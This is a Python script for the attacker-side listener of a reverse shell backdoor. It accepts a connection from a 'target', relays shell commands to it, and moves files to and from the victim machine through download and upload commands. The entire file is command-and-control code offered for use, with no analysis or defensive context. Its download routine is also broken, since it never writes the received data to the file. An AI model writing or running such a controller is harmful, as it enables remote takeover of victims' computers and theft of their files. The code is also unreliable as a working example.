import socket
import json
import os


HOST_IP = '127.0.0.1'
PORT = 5555


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode('cp437','ignore').rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication():
    while True:
        command = input('* Shell~%s ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'help':
            print(help_menu)
        elif command == 'clear':
            os.system('clear')
        elif command[:2] == 'cd':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)


help_menu = """\n
quit:                               Quits the program
help:                               Shows this menu
clear:                              Clears the terminal
cd [directory]:                     Changes directory to specified location
download [path_to_file]:            Downloads specified file
upload [path_to_file]:              Uploads specified file
"""


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST_IP,PORT))
print('[+] Listening For Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print("[+] Target Connected From: " + str(ip))
target_communication()